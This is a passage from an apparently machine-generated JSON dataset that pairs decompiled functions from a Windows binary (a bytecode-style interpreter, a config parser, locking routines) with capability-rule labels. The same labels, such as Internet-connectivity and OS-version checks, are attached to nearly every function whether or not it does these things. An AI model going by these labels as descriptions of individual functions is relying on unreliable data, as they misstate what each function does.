            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.00055bdc(ulong arg1, int64_t arg2, int64_t arg3, int64_t arg4)\n\n{\n    ulong uVar1;\n    uint32_t auStackX16 [6];\n    int64_t in_stack_00000028;\n    \n    if (arg2 == 0) {\n        uVar1 = 0x21590066;\n    }\n    else if (arg3 == 0) {\n        uVar1 = 0x21590067;\n    }\n    else if (arg4 == 0) {\n        uVar1 = 0x21590068;\n    }\n    else if (in_stack_00000028 == 0) {\n        uVar1 = 0x21590069;\n    }\n    else {\n        uVar1 = fcn.00054074(arg2, arg3, auStackX16);\n        if (uVar1 == 0) {\n            uVar1 = fcn.00055928(arg1, auStackX16[0], arg4, in_stack_00000028);\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 243
    },
    "00055c50": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t fcn.00055c50(ulong arg1)\n\n{\n    uint32_t uVar1;\n    uint64_t uVar2;\n    \n    if (*0x8d368 == 0) {\n        fcn.0006670a(0x8e3a0, arg1, 0x20);\n        uVar2 = fcn.000557c4();\n        if (uVar2 == 0) {\n            *0x8d368 = 1;\n            uVar1 = fcn.00055618(0xc3, 0x54000, 0x8d320, 0x8d328);\n            uVar2 = uVar1;\n            if (uVar1 != 0) {\n                fcn.00055a90();\n            }\n        }\n    }\n    else {\n        uVar2 = 0x21590006;\n    }\n    return uVar2;\n}\n",
        "token_count": 202
    },
    "00055cc0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.00055cc0(ulong noname_0, int64_t arg2, int64_t arg3, int64_t arg4)\n\n{\n    ulong uVar1;\n    ulong *in_stack_00000028;\n    \n    if (in_stack_00000028 == NULL) {\n        uVar1 = 0x21590069;\n    }\n    else {\n        *in_stack_00000028 = 0;\n        if (arg2 == 0) {\n            uVar1 = 0x21590066;\n        }\n        else if (arg3 == 0) {\n            uVar1 = 0x21590067;\n        }\n        else if (arg4 == 0) {\n            uVar1 = 0x21590068;\n        }\n        else if (*0x8d368 == 0) {\n            uVar1 = 0x21590001;\n        }\n        else if (*0x8d360 == -1) {\n            uVar1 = 0x21590007;\n        }\n        else {\n            uVar1 = fcn.00055bdc(noname_0, arg2, arg3, arg4);\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 264
    },
    "00055d30": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t fcn.00055d30(int64_t arg1, int64_t arg2, ulong arg3, ulong arg4)\n\n{\n    uint16_t uVar1;\n    uint8_t uVar2;\n    int32_t iVar3;\n    int64_t iVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uint64_t uVar7;\n    uint16_t *puVar8;\n    uint32_t auStack88 [18];\n    uint16_t *puVar9;\n    \n    if (arg1 == 0) {\n        return 0xffffffff;\n    }\n    uVar7 = 0;\n    puVar8 = arg1 + -8;\n    uVar6 = 0;\ncode_r0x00055d5c:\n    while( true ) {\n        uVar5 = uVar6;\n        puVar9 = puVar8;\n        puVar8 = puVar9 + 4;\n        uVar1 = *puVar8;\n        uVar6 = uVar7;\n        if (0x35 < uVar1) break;\n        if (uVar1 == 0x35) {\n            if (uVar5 < *(puVar9 + 6)) goto code_r0x00055e51;\n            goto code_r0x00056027;\n        }\n        if (uVar1 < 0x17) {\n            if (uVar1 == 0x16) {\n                return uVar5;\n            }\n            if (uVar1 < 6) {\n                if (uVar1 == 5) {\n                    uVar6 = *(puVar9 + 6);\n                    goto code_r0x00055e58;\n                }\n                if (uVar1 == 0) {\n                    uVar6 = *(puVar9 + 6);\n                }\n                else if (uVar1 == 1) {\n                    uVar7 = *(puVar9 + 6);\n                    uVar6 = uVar5;\n                }\n                else if (uVar1 == 2) {\n                    auStack88[*(puVar9 + 6)] = uVar5;\n                    uVar6 = uVar5;\n                }\n                else if (uVar1 == 3) {\n                    auStack88[*(puVar9 + 6)] = uVar6;\n                    uVar6 = uVar5;\n                }\n                else {\n                    if (uVar1 != 4) {\n                        return 0;\n                    }\n                    uVar6 = uVar5 + *(puVar9 + 6);\n                }\n            }\n            else {\n                if (uVar1 == 6) {\n                    return *(puVar9 + 6);\n                }\n                if (uVar1 == 7) {\n                    uVar7 = uVar5;\n                    uVar6 = uVar5;\n                }\n                else if (uVar1 == 0xc) {\n                    uVar6 = uVar5 + uVar6;\n                }\n                else {\n                    if (uVar1 != 0x14) {\n                        if (uVar1 != 0x15) {\n                            return 0;\n                        }\n                        uVar6 = *(puVar9 + 6);\ncode_r0x00055ead:\n                        if (uVar5 != uVar6) goto code_r0x00055e51;\n                        goto code_r0x00056027;\n                    }\n                    uVar6 = uVar5 - *(puVar9 + 6);\n                }\n            }\n        }\n        else if (uVar1 < 0x29) {\n            if (uVar1 == 0x28) {\n                iVar3 = *(puVar9 + 6);\n                goto code_r0x00055faf;\n            }\n            if (uVar1 == 0x1c) {\n                uVar6 = uVar5 - uVar6;\n            }\n            else {\n                if (uVar1 == 0x1d) goto code_r0x00055ead;\n                if (uVar1 == 0x20) {\n                    iVar3 = *(puVar9 + 6);\n                    goto code_r0x00055e6f;\n                }\n                if (uVar1 != 0x24) {\n                    if (uVar1 != 0x25) {\n                        return 0;\n                    }\n                    if (uVar5 <= *(puVar9 + 6)) goto code_r0x00055e51;\ncode_r0x00056027:\n                    uVar2 = *(puVar9 + 5);\n                    goto code_r0x00055e56;\n                }\n                uVar6 = uVar5 * *(puVar9 + 6);\n            }\n        }\n        else if (uVar1 == 0x2c) {\n            uVar6 = uVar5 * uVar6;\n        }\n        else {\n            if (uVar1 == 0x2d) {\n                if (uVar5 <= uVar6) goto code_r0x00055e51;\n                goto code_r0x00056027;\n            }\n            if (uVar1 == 0x30) {\n                if (arg4 <= *(puVar9 + 6)) {\n                    return 0;\n                }\n                iVar3 = *(puVar9 + 6);\n                goto code_r0x00056014;\n            }\n            if (uVar1 != 0x34) {\n                return 0;\n            }\n            uVar6 = uVar5 / *(puVar9 + 6);\n        }\n    }\n    if (0x60 < uVar1) {\n        if (0x80 < uVar1) {\n            if (uVar1 == 0x81) {\n                uVar7 = arg3;\n                uVar6 = uVar5;\n            }\n            else if (uVar1 == 0x84) {\n                uVar6 = -uVar5;\n            }\n            else if (uVar1 != 0x87) {\n                if (uVar1 != 0xb1) {\n                    return 0;\n                }\n                if (arg4 <= *(puVar9 + 6)) {\n                    return 0;\n                }\n                uVar7 = (*(*(puVar9 + 6) + arg2) & 0xf) << 2;\n                uVar6 = uVar5;\n            }\n            goto code_r0x00055d5c;\n        }\n        uVar6 = arg3;\n        if (uVar1 == 0x80) goto code_r0x00055d5c;\n        if (uVar1 != 0x61) {\n            if (uVar1 == 100) {\n                uVar2 = *(puVar9 + 6);\n            }\n            else {\n                uVar2 = uVar7;\n                if (uVar1 != 0x6c) {\n                    if (uVar1 == 0x74) {\n                        uVar2 = *(puVar9 + 6);\n                    }\n                    else if (uVar1 != 0x7c) {\n                        return 0;\n                    }\n                    uVar6 = uVar5 >> (uVar2 & 0x1f);\n                    goto code_r0x00055d5c;\n                }\n            }\n            uVar6 = uVar5 << (uVar2 & 0x1f);\n            goto code_r0x00055d5c;\n        }\n        uVar7 = auStack88[*(puVar9 + 6)];\n        uVar6 = uVar5;\n        goto code_r0x00055d5c;\n    }\n    if (uVar1 == 0x60) {\n        uVar6 = auStack88[*(puVar9 + 6)];\n        goto code_r0x00055d5c;\n    }\n    if (0x48 < uVar1) {\n        if (uVar1 == 0x4c) {\n            uVar6 = uVar5 | uVar6;\n        }\n        else if (uVar1 == 0x4d) {\ncode_r0x00056021:\n            if ((uVar6 & uVar5) != 0) goto code_r0x00056027;\ncode_r0x00055e51:\n            uVar2 = *(puVar9 + 0xb);\ncode_r0x00055e56:\n            uVar6 = uVar2;\ncode_r0x00055e58:\n            puVar8 = puVar8 + uVar6 * 4;\n            uVar6 = uVar5;\n        }\n        else if (uVar1 == 0x50) {\n            iVar3 = uVar6 + *(puVar9 + 6);\n            if (arg4 <= iVar3) {\n                return 0;\n            }\ncode_r0x00056014:\n            uVar6 = *(iVar3 + arg2);\n        }\n        else if (uVar1 == 0x54) {\n            uVar6 = uVar5 & *(puVar9 + 6);\n        }\n        else {\n            if (uVar1 != 0x5c) {\n                return 0;\n            }\n            uVar6 = uVar5 & uVar6;\n        }\n        goto code_r0x00055d5c;\n    }\n    if (uVar1 == 0x48) {\n        iVar3 = uVar6 + *(puVar9 + 6);\ncode_r0x00055faf:\n        iVar4 = iVar3;\n        if (arg4 < iVar4 + 2U) {\n            return 0;\n        }\n        uVar6 = *(iVar4 + arg2);\n        uVar2 = *(iVar4 + 1 + arg2);\n    }\n    else {\n        if (uVar1 == 0x3c) {\n            if (uVar6 == 0) {\n                return 0;\n            }\n            uVar6 = uVar5 / uVar7;\n            goto code_r0x00055d5c;\n        }\n        if (uVar1 == 0x3d) {\n            if (uVar5 < uVar6) goto code_r0x00055e51;\n            goto code_r0x00056027;\n        }\n        if (uVar1 != 0x40) {\n            if (uVar1 != 0x44) {\n                if (uVar1 != 0x45) {\n                    return 0;\n                }\n                uVar6 = *(puVar9 + 6);\n                goto code_r0x00056021;\n            }\n            uVar6 = uVar5 | *(puVar9 + 6);\n            goto code_r0x00055d5c;\n        }\n        iVar3 = uVar6 + *(puVar9 + 6);\ncode_r0x00055e6f:\n        iVar4 = iVar3;\n        if (arg4 < iVar4 + 4U) {\n            return 0;\n        }\n        uVar6 = CONCAT21(CONCAT11(*(iVar4 + arg2), *(iVar4 + 1 + arg2)), *(iVar4 + 2 + arg2));\n        uVar2 = *(iVar4 + 3 + arg2);\n    }\n    uVar6 = uVar6 << 8 | uVar2;\n    goto code_r0x00055d5c;\n}\n",
        "token_count": 2443
    },
    "00056104": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Type propagation algorithm not settling\n\nuint32_t fcn.00056104(int64_t arg1, int64_t arg2, int64_t arg3, ulong arg4)\n\n{\n    uint16_t uVar1;\n    int32_t iVar2;\n    unkuint3 Var3;\n    uint8_t uVar4;\n    int64_t iVar5;\n    uint64_t uVar6;\n    uint32_t uVar7;\n    int32_t iVar8;\n    uint32_t uVar9;\n    uint64_t uVar10;\n    uint16_t *puVar11;\n    int64_t iVar13;\n    uint32_t in_stack_00000028;\n    uint32_t in_stack_00000030;\n    uint32_t auStack104 [18];\n    uint16_t *puVar12;\n    \n    iVar13 = arg4;\n    if (arg1 == 0) {\n        return 0xffffffff;\n    }\n    uVar6 = in_stack_00000030;\n    uVar10 = 0;\n    puVar11 = arg1 + -8;\n    uVar9 = 0;\ncode_r0x00056139:\n    while( true ) {\n        uVar7 = uVar9;\n        puVar12 = puVar11;\n        puVar11 = puVar12 + 4;\n        uVar1 = *puVar11;\n        uVar9 = uVar10;\n        if (0x35 < uVar1) break;\n        if (uVar1 == 0x35) {\n            if (uVar7 < *(puVar12 + 6)) goto code_r0x00056232;\ncode_r0x0005648e:\n            uVar4 = *(puVar12 + 5);\n            goto code_r0x00056237;\n        }\n        if (uVar1 < 0x17) {\n            if (uVar1 == 0x16) {\n                return uVar7;\n            }\n            if (uVar1 < 6) {\n                if (uVar1 == 5) {\n                    uVar9 = *(puVar12 + 6);\n                    goto code_r0x00056239;\n                }\n                if (uVar1 == 0) {\n                    uVar9 = *(puVar12 + 6);\n                }\n                else if (uVar1 == 1) {\n                    uVar10 = *(puVar12 + 6);\n                    uVar9 = uVar7;\n                }\n                else if (uVar1 == 2) {\n                    auStack104[*(puVar12 + 6)] = uVar7;\n                    uVar9 = uVar7;\n                }\n                else if (uVar1 == 3) {\n                    auStack104[*(puVar12 + 6)] = uVar9;\n                    uVar9 = uVar7;\n                }\n                else {\n                    if (uVar1 != 4) {\n                        return 0;\n                    }\n                    uVar9 = uVar7 + *(puVar12 + 6);\n                }\n            }\n            else {\n                if (uVar1 == 6) {\n                    return *(puVar12 + 6);\n                }\n                if (uVar1 == 7) {\n                    uVar10 = uVar7;\n                    uVar9 = uVar7;\n                }\n                else if (uVar1 == 0xc) {\n                    uVar9 = uVar7 + uVar9;\n                }\n                else {\n                    if (uVar1 != 0x14) {\n                        if (uVar1 != 0x15) {\n                            return 0;\n                        }\n                        uVar9 = *(puVar12 + 6);\ncode_r0x000562b9:\n                        if (uVar7 != uVar9) goto code_r0x00056232;\n                        goto code_r0x0005648e;\n                    }\n                    uVar9 = uVar7 - *(puVar12 + 6);\n                }\n            }\n        }\n        else if (uVar1 < 0x29) {\n            if (uVar1 == 0x28) {\n                iVar5 = *(puVar12 + 6);\n                if (uVar6 < iVar5 + 2U) {\n                    return 0;\n                }\n                iVar8 = *(puVar12 + 6);\n                iVar2 = *(puVar12 + 6) - arg4;\n                goto code_r0x000562e1;\n            }\n            if (uVar1 == 0x1c) {\n                uVar9 = uVar7 - uVar9;\n            }\n            else {\n                if (uVar1 == 0x1d) goto code_r0x000562b9;\n                if (uVar1 == 0x20) {\n                    iVar5 = *(puVar12 + 6);\n                    if (uVar6 < iVar5 + 4U) {\n                        return 0;\n                    }\n                    iVar8 = *(puVar12 + 6);\n                    iVar2 = *(puVar12 + 6) - arg4;\n                    goto code_r0x00056261;\n                }\n                if (uVar1 != 0x24) {\n                    if (uVar1 != 0x25) {\n                        return 0;\n                    }\n                    if (uVar7 <= *(puVar12 + 6)) goto code_r0x00056232;\n                    goto code_r0x0005648e;\n                }\n                uVar9 = uVar7 * *(puVar12 + 6);\n            }\n        }\n        else if (uVar1 == 0x2c) {\n            uVar9 = uVar7 * uVar9;\n        }\n        else {\n            if (uVar1 == 0x2d) {\n                if (uVar7 <= uVar9) goto code_r0x00056232;\n                goto code_r0x0005648e;\n            }\n            if (uVar1 == 0x30) {\n                iVar8 = *(puVar12 + 6);\n                if (in_stack_00000030 <= iVar8) {\n                    return 0;\n                }\n                goto joined_r0x00056472;\n            }\n            if (uVar1 != 0x34) {\n                return 0;\n            }\n            uVar9 = uVar7 / *(puVar12 + 6);\n        }\n    }\n    if (0x60 < uVar1) {\n        if (0x80 < uVar1) {\n            if (uVar1 == 0x81) {\n                uVar10 = in_stack_00000028;\n                uVar9 = uVar7;\n            }\n            else if (uVar1 == 0x84) {\n                uVar9 = -uVar7;\n            }\n            else if (uVar1 != 0x87) {\n                if (uVar1 != 0xb1) {\n                    return 0;\n                }\n                iVar8 = *(puVar12 + 6);\n                if (in_stack_00000030 <= iVar8) {\n                    return 0;\n                }\n                if (iVar8 < arg4) {\n                    uVar4 = *(iVar8 + arg2);\n                }\n                else {\n                    uVar4 = *((iVar8 - iVar13) + arg3);\n                }\n                uVar10 = (uVar4 & 0xf) << 2;\n                uVar9 = uVar7;\n            }\n            goto code_r0x00056139;\n        }\n        uVar9 = in_stack_00000028;\n        if (uVar1 == 0x80) goto code_r0x00056139;\n        if (uVar1 != 0x61) {\n            if (uVar1 == 100) {\n                uVar4 = *(puVar12 + 6);\n            }\n            else {\n                uVar4 = uVar10;\n                if (uVar1 != 0x6c) {\n                    if (uVar1 == 0x74) {\n                        uVar4 = *(puVar12 + 6);\n                    }\n                    else if (uVar1 != 0x7c) {\n                        return 0;\n                    }\n                    uVar9 = uVar7 >> (uVar4 & 0x1f);\n                    goto code_r0x00056139;\n                }\n            }\n            uVar9 = uVar7 << (uVar4 & 0x1f);\n            goto code_r0x00056139;\n        }\n        uVar10 = auStack104[*(puVar12 + 6)];\n        uVar9 = uVar7;\n        goto code_r0x00056139;\n    }\n    if (uVar1 == 0x60) {\n        uVar9 = auStack104[*(puVar12 + 6)];\n        goto code_r0x00056139;\n    }\n    if (0x48 < uVar1) {\n        if (uVar1 == 0x4c) {\n            uVar9 = uVar7 | uVar9;\n        }\n        else if (uVar1 == 0x4d) {\ncode_r0x00056488:\n            if ((uVar9 & uVar7) != 0) goto code_r0x0005648e;\ncode_r0x00056232:\n            uVar4 = *(puVar12 + 0xb);\ncode_r0x00056237:\n            uVar9 = uVar4;\ncode_r0x00056239:\n            puVar11 = puVar11 + uVar9 * 4;\n            uVar9 = uVar7;\n        }\n        else if (uVar1 == 0x50) {\n            iVar8 = uVar9 + *(puVar12 + 6);\n            if (in_stack_00000030 <= iVar8) {\n                return 0;\n            }\njoined_r0x00056472:\n            if (iVar8 < arg4) {\n                uVar9 = *(iVar8 + arg2);\n            }\n            else {\n                uVar9 = *((iVar8 - iVar13) + arg3);\n            }\n        }\n        else if (uVar1 == 0x54) {\n            uVar9 = uVar7 & *(puVar12 + 6);\n        }\n        else {\n            if (uVar1 != 0x5c) {\n                return 0;\n            }\n            uVar9 = uVar7 & uVar9;\n        }\n        goto code_r0x00056139;\n    }\n    if (uVar1 == 0x48) {\n        iVar8 = uVar9 + *(puVar12 + 6);\n        iVar5 = iVar8;\n        if (uVar6 < iVar5 + 2U) {\n            return 0;\n        }\n        iVar2 = iVar8 - arg4;\ncode_r0x000562e1:\n        if (SBORROW4(iVar8, arg4) == iVar2 < 0) {\n            uVar7 = *((iVar5 - iVar13) + arg3) << 8;\n            uVar9 = *((iVar5 - iVar13) + 1 + arg3);\n        }\n        else {\n            uVar7 = *(iVar5 + arg2) << 8;\n            uVar9 = *(iVar5 + 1 + arg2);\n        }\n    }\n    else {\n        if (uVar1 == 0x3c) {\n            if (uVar9 == 0) {\n                return 0;\n            }\n            uVar9 = uVar7 / uVar10;\n            goto code_r0x00056139;\n        }\n        if (uVar1 == 0x3d) {\n            if (uVar7 < uVar9) goto code_r0x00056232;\n            goto code_r0x0005648e;\n        }\n        if (uVar1 != 0x40) {\n            if (uVar1 != 0x44) {\n                if (uVar1 != 0x45) {\n                    return 0;\n                }\n                uVar9 = *(puVar12 + 6);\n                goto code_r0x00056488;\n            }\n            uVar9 = uVar7 | *(puVar12 + 6);\n            goto code_r0x00056139;\n        }\n        iVar8 = uVar9 + *(puVar12 + 6);\n        iVar5 = iVar8;\n        if (uVar6 < iVar5 + 4U) {\n            return 0;\n        }\n        iVar2 = iVar8 - arg4;\ncode_r0x00056261:\n        if (SBORROW4(iVar8, arg4) == iVar2 < 0) {\n            iVar5 = iVar5 - iVar13;\n            Var3 = CONCAT21(CONCAT11(*(iVar5 + arg3), *(iVar5 + 1 + arg3)), *(iVar5 + 2 + arg3));\n            uVar4 = *(iVar5 + 3 + arg3);\n        }\n        else {\n            Var3 = CONCAT21(CONCAT11(*(iVar5 + arg2), *(iVar5 + 1 + arg2)), *(iVar5 + 2 + arg2));\n            uVar4 = *(iVar5 + 3 + arg2);\n        }\n        uVar9 = uVar4;\n        uVar7 = Var3 << 8;\n    }\n    uVar9 = uVar7 | uVar9;\n    goto code_r0x00056139;\n}\n",
        "token_count": 2888
    },
    "00056bc8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00056bc8(char *arg1, uint64_t arg2)\n\n{\n    char *pcVar1;\n    char cVar2;\n    int64_t iVar3;\n    uchar *puVar4;\n    char *pcVar5;\n    ulong *puVar6;\n    uint64_t uVar7;\n    char *pcVar8;\n    bool bVar9;\n    \n    uVar7 = arg2 & 0xffffffff;\n    iVar3 = fcn.00030c98(arg2 & 0xffffffff);\n    if (iVar3 != 0) {\n        fcn.0006670a(iVar3, arg1, uVar7);\n        fcn.00030310(0x8d370);\n        fcn.00030d24(*0x8e028);\n        pcVar1 = arg1 + uVar7;\n        *0x8e018 = uVar7;\n        *0x8e020 = arg1;\n        *0x8e028 = iVar3;\n        if (arg1 < pcVar1) {\n            puVar6 = 0x8d3a8;\n            do {\n                pcVar8 = arg1;\n                cVar2 = *arg1;\n                while ((cVar2 != '\\0' && (pcVar8 < pcVar1))) {\n                    pcVar8 = pcVar8 + 1;\n                    cVar2 = *pcVar8;\n                }\n                if ((*arg1 != '\\0') && (puVar4 = fcn.0006682a(arg1, 0x23),  puVar4 != NULL)) {\n                    *puVar4 = 0;\n                    iVar3 = 2;\n                    puVar4 = puVar4 + 1;\n                    bVar9 = puVar4 == NULL;\n                    pcVar5 = 0x15ec0;\n                    do {\n                        if (iVar3 == 0) break;\n                        iVar3 = iVar3 + -1;\n                        bVar9 = *arg1 == *pcVar5;\n                        arg1 = arg1 + 1;\n                        pcVar5 = pcVar5 + 1;\n                    } while (bVar9);\n                    if (bVar9) {\n                        puVar6[-2] = puVar4;\n                        puVar4 = fcn.0006682a(puVar4, 0x23);\n                        if (puVar4 != NULL) {\n                            *puVar4 = 0;\n                            *puVar6 = puVar4 + 1;\n                            puVar4 = fcn.0006682a(puVar4 + 1, 0x23);\n                            if (puVar4 != NULL) {\n                                *puVar4 = 0;\n                                puVar6[1] = puVar4 + 1;\n                                puVar4 = fcn.0006682a(puVar4 + 1, 0x23);\n                                if (puVar4 != NULL) {\n                                    *puVar4 = 0;\n                                    pcVar5 = puVar4 + 1;\n                                    if ((puVar4[2] == '#') || (puVar4[2] == '\\0')) {\n                                        if ((*pcVar5 == '1') || ((*pcVar5 == 'y' || (*pcVar5 == 'Y')))) {\n                                            *(puVar6 + 0x1a) = 1;\n                                        }\n                                        else {\n                                            if (((*pcVar5 != '0') && (*pcVar5 != 'n')) && (*pcVar5 != 'N'))\n                                            goto code_r0x00056d5e;\n                                            *(puVar6 + 0x1a) = 0;\n                                        }\n                                        puVar4 = fcn.0006682a(pcVar5, 0x23);\n                                        if (puVar4 == NULL) {\n                                            puVar6[2] = 0;\n                                        }\n                                        else {\n                                            *puVar4 = 0;\n                                            puVar6[2] = puVar4 + 1;\n                                        }\n                                        *(puVar6 + 0x19) = 1;\n                                        *(puVar6 + 3) = 1;\n                                        puVar6[4] = 0;\n                                        puVar6[5] = 0;\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\ncode_r0x00056d5e:\n                puVar6 = puVar6 + 8;\n                arg1 = pcVar8 + 1;\n            } while (pcVar8 + 1 < pcVar1);\n        }\n        fcn.00030378(0x8d370);\n    }\n    return;\n}\n",
        "token_count": 994
    },
    "00056ff4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.00056ff4(int64_t *arg1)\n\n{\n    int64_t iVar1;\n    int32_t iVar2;\n    \n    iVar1 = arg1[1];\n    if (*(iVar1 + 0x30) != 0) {\n        iVar2 = fcn.00051cf8(*(iVar1 + 0x10), *(iVar1 + 0x30), 0, 0);\n        if (iVar2 != 0) goto code_r0x00057031;\n    }\n    fcn.00051ffc(*(arg1[1] + 0x10), *(arg1[1] + 0x20));\ncode_r0x00057031:\n    LOCK();\n    *(*arg1 + 0x30) = *(*arg1 + 0x30) + -1;\n    fcn.000325d8(0x8d378, 0);\n    fcn.00030d24(arg1);\n    return 0;\n}\n",
        "token_count": 213
    },
    "00057058": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00057058(void)\n\n{\n    int32_t iVar1;\n    ulong *puVar2;\n    ulong *puVar3;\n    int64_t arg2;\n    int32_t iVar4;\n    uint32_t uVar5;\n    int64_t arg2_00;\n    uint32_t uVar6;\n    \n    arg2_00 = 0;\n    uVar6 = 0;\n    do {\n        arg2 = 0;\n        iVar4 = -1;\n        while( true ) {\n            fcn.00030310(0x8d370);\n            iVar1 = fcn.000325fc(0x8d378, 1);\n            if (iVar1 != 0) break;\n            fcn.00030378(0x8d370);\n            (**0x115e8)(0, 0);\n        }\n        uVar5 = 0;\n        puVar3 = 0x8d3d0;\n        do {\n            *(puVar3 + -2) = 0;\n            if (*(puVar3 + -0xf) != '\\0') {\n                for (puVar2 = *puVar3; puVar2 != NULL; puVar2 = *puVar2) {\n                    if ((puVar2[4] != 0) && (*(puVar2 + 0x1c) == 0)) {\n                        arg2 = puVar2[4];\n                        arg2_00 = puVar2[6];\n                        uVar6 = *(puVar2 + 2);\n                        *(puVar2 + 0x14) = 1;\n                        puVar2[4] = 0;\n                        if (arg2 != 0) goto code_r0x0005711c;\n                        break;\n                    }\n                }\n                fcn.00030d24(*puVar3);\n                *(puVar3 + -0xf) = 0;\n            }\n            uVar5 = uVar5 + 1;\n            puVar3 = puVar3 + 8;\n        } while (uVar5 < 0x32);\ncode_r0x0005711c:\n        if (0x31 < uVar5) {\n            *0x8e018 = 0;\n            fcn.00030d24(*0x8e020);\n            iVar4 = 0;\n        }\n        fcn.000325d8(0x8d378, 1);\n        fcn.00030378(0x8d370);\n        if (iVar4 == 0) {\n            return;\n        }\n        if (arg2 != 0) {\n            if (arg2_00 != 0) {\n                iVar4 = fcn.00051cf8(uVar6, arg2_00, 0, 0);\n            }\n            if (iVar4 == 0) {\n                fcn.00051ffc(uVar6, arg2);\n            }\n        }\n    } while( true );\n}\n",
        "token_count": 639
    },
    "000571a4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.000571a4(void)\n\n{\n    if (*0x8e040 != 0) {\n        *0x8e040 = 0;\n        fcn.00032748(0x8e030, 0);\n        fcn.00032710(0x8e030);\n        fcn.00057058();\n        fcn.00030310(0x8d370);\n        fcn.00030378(0x8d370);\n        fcn.000326c0(0x8d378);\n        fcn.000302e8(0x8d370);\n        fcn.00030d24(*0x8e028);\n        fcn.0006677c(0x8d370, 0, 0xcc0);\n    }\n    return;\n}\n",
        "token_count": 177
    },
    "00057520": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00057520(char *arg1, ulong arg2)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int64_t iVar4;\n    int64_t *arg1_00;\n    uint64_t uVar5;\n    ulong *puVar6;\n    char *pcVar7;\n    char *pcVar8;\n    uint32_t uVar9;\n    uint64_t uVar10;\n    int32_t iVar11;\n    bool bVar12;\n    \n    puVar6 = NULL;\n    if (*0x8e040 != 0) {\ncode_r0x0005754a:\n        bVar12 = false;\n        fcn.00030310(0x8d370);\n        uVar10 = 0;\n        pcVar7 = 0x8d3c0;\n        do {\n            if ((pcVar7[1] != '\\0') && (*pcVar7 != '\\0')) {\n                iVar4 = *(pcVar7 + -0x28);\n                uVar5 = 0xffffffffffffffff;\n                pcVar8 = arg1;\n                do {\n                    if (uVar5 == 0) break;\n                    uVar5 = uVar5 - 1;\n                    cVar1 = *pcVar8;\n                    pcVar8 = pcVar8 + 1;\n                } while (cVar1 != '\\0');\n                iVar11 = 0;\n                iVar3 = ~uVar5 - 1;\n                do {\n                    if (((*(iVar3 + iVar4) == ',') || (*(iVar3 + iVar4) == '\\0')) &&\n                       (iVar2 = fcn.00066812(arg1, iVar4, ~uVar5 - 1 & 0xffffffff),  iVar2 == 0)) break;\n                    iVar4 = fcn.0006682a();\n                    iVar11 = iVar11 + 1 + iVar3;\n                    if (iVar4 == 0) goto code_r0x00057638;\n                } while (iVar11 + iVar3 < 0x104);\n                if (iVar4 != 0) {\n                    for (puVar6 = *(pcVar7 + 0x10); puVar6 != NULL; puVar6 = *puVar6) {\n                        if (*(puVar6 + 2) == arg2) {\n                            if ((puVar6[4] != 0) && (*(puVar6 + 0x1c) == 0)) {\n                                *(puVar6 + 0x1c) = 1;\n                                fcn.0001a264(arg2);\n                                fcn.000324dc(0x8d378, 0);\n                                bVar12 = true;\n                                break;\n                            }\n                            *(puVar6 + 0x1c) = 1;\n                        }\n                    }\n                    if (bVar12) break;\n                }\n            }\ncode_r0x00057638:\n            uVar9 = uVar10 + 1;\n            uVar10 = uVar9;\n            pcVar7 = pcVar7 + 0x40;\n        } while (uVar9 < 0x32);\n        fcn.00030378(0x8d370);\n        if (bVar12) {\n            iVar3 = fcn.0001a238();\n            bVar12 = iVar3 == 0;\n            if (!bVar12) goto code_r0x00057695;\n            arg1_00 = fcn.00030c98(0x18);\n            if (arg1_00 != NULL) {\n                arg1_00[1] = puVar6;\n                *arg1_00 = uVar10 * 0x40 + 0x8d398;\n                